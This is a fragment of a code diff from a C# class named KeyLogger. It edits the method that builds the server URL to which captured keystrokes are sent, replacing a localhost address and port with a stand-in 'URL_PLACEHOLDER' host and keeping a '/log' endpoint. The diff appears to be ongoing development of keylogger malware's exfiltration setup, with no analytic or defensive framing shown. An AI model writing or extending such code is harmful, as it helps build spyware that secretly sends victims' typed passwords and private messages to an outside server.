@@ -126,13 +126,13 @@ class KeyLogger
 
     private static string GetServerUrl()
     {
-        string ipAddress = "localhost";  // Default to local IP
+        string ipAddress = "URL_PLACEHOLDER";  // Default to local IP
         bool forwarded = false;  // Set this flag to true if you want to use the forwarded IP
         if (forwarded)
         {
             ipAddress = GetLocalIPAddress();  // Dynamically get the local machine IP
         }
-        return $"http://{ipAddress}:2000/log";  // Construct URL dynamically
+        return $"http://{ipAddress}/log";  // Construct URL dynamically
     }
 
     private static string GetLocalIPAddress()
